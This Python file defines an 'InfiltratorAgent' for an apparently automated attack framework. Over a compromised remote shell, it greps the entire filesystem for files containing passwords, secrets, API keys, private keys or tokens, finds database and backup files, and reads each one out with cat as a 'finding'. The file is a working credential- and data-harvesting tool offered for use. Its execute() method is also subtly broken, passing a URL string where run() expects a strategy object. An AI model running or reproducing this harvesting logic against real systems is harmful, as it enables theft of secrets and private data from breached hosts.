
from core.data_models import InfiltratorReport, Strategy, InfiltratorFinding, AttackPhase, ErrorType
from core.data_models import AgentData, Strategy
from core.logger import log
import asyncio
from typing import Optional
from core.shell_manager import ShellManager
import time

from core.base_agent import BaseAgent


class InfiltratorAgent(BaseAgent):
    # Assuming AttackPhase enum is not available
    supported_phases = ["POST_EXPLOITATION"]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.shell_manager: Optional[ShellManager] = None
        self.keywords = ["password", "secret",
                         "api_key", "private_key", "token"]
        self.db_extensions = ["*.db", "*.sql", "*.bak", "*.sqlite", "*.mdb"]
        self.report_class = InfiltratorReport # Set report class

    async def setup(self):
        """Asynchronous setup method for InfiltratorAgent."""
        self.shell_manager = await self.context_manager.get_context('shell_manager')

    async def run(self, strategy: Strategy, **kwargs) -> InfiltratorReport:
        start_time = time.time()
        log.info(
            f"Running Infiltrator Agent with directive: {strategy.directive}")
        shell_id = strategy.context.get("shell_id")
        if not shell_id:
            end_time = time.time()
            return InfiltratorReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=["Missing shell_id in context"],
                error_type=ErrorType.CONFIGURATION,
                summary="Infiltrator failed: Missing shell ID."
            )

        keyword_files = await self._search_files_by_keyword(shell_id)
        db_files = await self._search_for_db_files(shell_id)

        found_files = list(set(keyword_files + db_files))

        findings = []
        for file_path in found_files:
            content = await self._read_file_content(shell_id, file_path)
            if content:
                finding = InfiltratorFinding(
                    finding_type="file_content",
                    value=content,
                    source=file_path
                )
                findings.append(finding)

        end_time = time.time()
        if findings:
            summary = f"Found {len(findings)} sensitive files."
            return InfiltratorReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                findings=findings,
                summary=summary
            )
        else:
            summary = "No sensitive files found."
            return InfiltratorReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                summary=summary
            )

    async def _search_files_by_keyword(self, shell_id: str) -> list[str]:
        log.info(f"Searching for files with keywords: {self.keywords}")
        command = f"grep -rliE '({'|'.join(self.keywords)})' / 2>/dev/null"
        output = await self.shell_manager.send_command(shell_id, command)
        if output:
            return output.splitlines()
        return []

    async def _search_for_db_files(self, shell_id: str) -> list[str]:
        log.info(
            f"Searching for database files with extensions: {self.db_extensions}")
        name_patterns = ' -o '.join([f'-name "{ext}"' for ext in self.db_extensions])
        command = f"find / -type f \\( {name_patterns} \\) 2>/dev/null"
        output = await self.shell_manager.send_command(shell_id, command)
        if output:
            return output.splitlines()
        return []

    async def _read_file_content(self, shell_id: str, file_path: str) -> str | None:
        log.info(f"Reading content of file: {file_path}")
        command = f"cat {file_path}"
        output = await self.shell_manager.send_command(shell_id, command)
        return output

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute infiltrator agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
